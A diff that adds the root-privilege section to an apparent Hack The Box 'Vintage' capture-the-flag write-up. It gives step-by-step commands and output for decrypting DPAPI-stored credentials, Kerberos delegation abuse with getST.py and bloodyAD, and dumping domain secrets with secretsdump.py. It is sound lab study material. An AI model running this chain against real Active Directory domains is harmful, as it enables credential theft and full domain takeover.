@@ -273,15 +273,131 @@ Read the flag
 ``` 
 
 ## Root exploit
-- Reading DPAPI secret from the user
-- Pivot into c.neri_adm
-- S4U2SELF attack
-1. Add the user svc_sql into the groupd that we just got `GenericWrite` access to `DelegatedAdmins`.
-2. We use this account because C.Neri have `GenericAll` on it. We will be able to add an SPN.
-3. Using previously added SPN, we will be able to fetch a TGS and impersonate the user `L.BIANCHI_ADM`
+Using `winpeas`, you find `DPAPI` encrypted secrets on the box.
+Per [HackerRecipies](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
+>The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
+
+`C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID`
+
+You can find the key and the secret with these commands
+```bash
+> gci -force AppData\Roaming\Microsoft\Protect\
+
+Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d---s-          6/7/2024   1:17 PM                S-1-5-21-4024337825-2033394866-2055507597-1115
+-a-hs-          6/7/2024   1:17 PM             24 CREDHIST
+-a-hs-          6/7/2024   1:17 PM             76 SYNCHIST
+```
+Listing the content of the repository
+```bash
+> ls -force
+
+Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
+-a-hs-          6/7/2024   1:17 PM             24 Preferred
+```
+Finding the encrypted credentials
+```bash
+> ls -force ..\AppData\Roaming\Microsoft\Credentials\
+
+Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
+
+```
+Download both files `C4BB96844A5C9DD45D5B6A9859252BA6` and `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`
+Using `dpapi.py` you can retrieve the masterkey used in the encryption process. With that key, it will be possible to decrypt the actual secret.
+
+```bash
+>dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid 'S-1-5-21-4024337825-2033394866-2055507597-1115' -password 'Zer0the0ne' > decrypted_key
 
 
-___
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+```
+Using the `Decrypted Key`, get the secret
+```bash
+dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key '0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2024-06-07 15:08:23
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000001 (CRED_TYPE_GENERIC)
+Target      : LegacyGeneric:target=admin_acc
+Description : 
+Unknown     : 
+Username    : vintage\c.neri_adm
+Unknown     : Uncr4ck4bl3P4ssW0rd0312
+```
+`vintage\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312`
+You can use this information to get a kerberos ticket and connect into the box
+```bash
+impacket-getTGT 'VINTAGE.HTB'/'c.neri_adm' -dc-ip 10.129.231.205
+
+export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/c.neri_adm.ccache
+
+evil-winrm -i dc01.vintage.htb -r vintage.htb
+```
+Looking into Bloodhound, we can find the next attack.
+![alt text](/content/img/htb/vintage/bloodhound_c.neri_adm_allowtoact.png)
+
+Analyze:
+- `C.NERI_ADM` has `GenericWrite` on `DELEGATEDADMINS@VINTAGE.HTB`
+- `DELEGATEDADMINS@VINTAGE.HTB` has `AllowedToAct` on `DC01.VINTAGE.HTB`
+  
+It means we can fetch a service ticket with Kerberos and impersonate anyone on the box.
+We will use this to dump all secrets from the AD.
+
+```bash
+impacket-getTGT 'VINTAGE.HTB'/'c.neri_adm' -dc-ip 10.129.231.205
+export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/c.neri_adm.ccache
+evil-winrm -i dc01.vintage.htb -r vintage.htb
+```
+Add the computer account into the group
+```bash
+python3 bloodyAD.py --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb -k add groupMember 'DelegatedAdmins' 'fs01$'
+```
+Get the service ticket
+```bash
+getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' -dc-ip 10.129.231.205 -k 'vintage.htb/fs01$:fs01'
+```
+Using the kerberos ticket to dump the secret
+```bash
+KRB5CCNAME='/home/brainmoustache/hackthebox/vintage/dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' secretsdump.py -k dc01.vintage.htb
+```
+You can also directly target the user `L.BIANCHI_ADM` because this user is `Domain Admins`
+```bash
+getST.py -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.129.231.205 -k 'vintage.htb/fs01$:fs01'
+
+KRB5CCNAME='/home/brainmoustache/hackthebox/vintage/L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' wmiexec.py -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb 
+```
+
+`type c:\users\administrator\desktop\root.txt`
+
 ## Resources:
 
 | Hyperlink                                                                                                                                                                    | Info                                      |
@@ -291,10 +407,9 @@ ___
 | https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers                                                                                                | Pre-Windows 2000 computers                |
 | https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/                                                                                                   | Diving into pre created computer accounts |
 | https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/group-managed-service-accounts-overview | Group Managed Service Accounts Overview   |
-|                                                                                                                                                                              |                                           |
-|                                                                                                                                                                              |                                           |
-
-
-
-
-
+| https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md                                                                                                | Winpeas                                   |
+| https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets                                                                                        | DPAPI protected secrets                   |
+| https://0xdf.gitlab.io/2023/04/01/htb-sekhmet.html#dpapi                                                                                                                     | dpapi                                     |
+| https://github.com/fortra/impacket/blob/master/examples/secretsdump                                                                                                          | secretsdump.py                            |
+| https://github.com/fortra/impacket/blob/master/examples/dpapi.py                                                                                                             | dpapi.py                                  |
+| https://github.com/CravateRouge/bloodyAD                                                                                                                                     | BloodyAD                                  |
